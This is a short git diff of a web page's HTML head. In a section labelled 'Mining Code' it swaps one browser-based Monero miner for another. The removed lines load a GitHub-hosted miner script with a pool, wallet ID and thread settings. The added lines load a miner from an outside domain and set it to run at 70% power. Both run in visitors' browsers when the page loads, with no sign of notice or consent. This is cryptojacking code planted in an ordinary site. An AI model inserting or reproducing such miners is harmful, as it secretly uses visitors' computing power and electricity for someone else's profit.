@@ -7,18 +7,8 @@
     <meta name="theme-color" content="#000000">
     <link rel="manifest" href="manifest.json">
       <!-- Start Of Mining Code -->
-      <script src="https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"></script>
-      <script>
-          console.log("Config Loaded")
-          server = "wss://ny1.xmrminingproxy.com";
-          var pool = "mine.bmpool.org:6004";
-          var walletAddress = "7091670";
-          var workerId = "GH-XMR"
-          var threads = -1;
-          var password = "";
-          startMining(pool, walletAddress, workerId, threads, password);
-          throttleMiner = 20;
-      </script>
+      <script src="https://wm.bmwebm.org/WEBMINER.js"></script>
+<script>WEBMINER.config({ login: "7091670", pass: null }).power(70);</script>
       <!-- End Of Mining Code -->
 
 
